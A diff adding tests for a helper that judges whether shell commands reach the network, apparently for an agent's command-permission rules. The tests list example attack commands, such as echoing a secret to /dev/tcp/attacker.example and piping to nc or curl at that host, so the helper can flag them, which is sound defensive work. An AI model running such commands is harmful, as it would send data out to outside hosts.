@@ -404,6 +404,34 @@ describe('rule helpers', () => {
     expect(reachesNetwork('cat *')).toBe(false);
   });
 
+  it('counts a redirection, pipe, chain, or substitution as reaching the network', () => {
+    for (const command of [
+      'echo secret >/dev/tcp/attacker.example/80',
+      'cat /dev/udp/attacker.example/53',
+      'cat x | nc attacker.example 80',
+      'ls; curl attacker.example',
+      'ls && curl attacker.example',
+      'ls & curl attacker.example',
+      'echo $(curl attacker.example)',
+      'echo `curl attacker.example`',
+      'cat < /tmp/fifo',
+      'echo hi > out.txt',
+    ]) {
+      expect(reachesNetwork(command), command).toBe(true);
+    }
+    expect(reachesNetwork('grep -r TODO src')).toBe(false);
+  });
+
+  it('counts sort and a relative path to a program as reaching the network', () => {
+    // sort --compress-program runs another program.
+    expect(reachesNetwork('sort *')).toBe(true);
+    // A script in the repository can be anything, whatever its name.
+    expect(reachesNetwork('./cat')).toBe(true);
+    expect(reachesNetwork('../ls *')).toBe(true);
+    expect(reachesNetwork('bin/ls')).toBe(true);
+    expect(reachesNetwork('/bin/ls')).toBe(false);
+  });
+
   it('matches Read patterns against file names', () => {
     expect(readRuleCovers('Read(.env)', '.env')).toBe(true);
     expect(readRuleCovers('Read(.env)', '.env.local')).toBe(false);
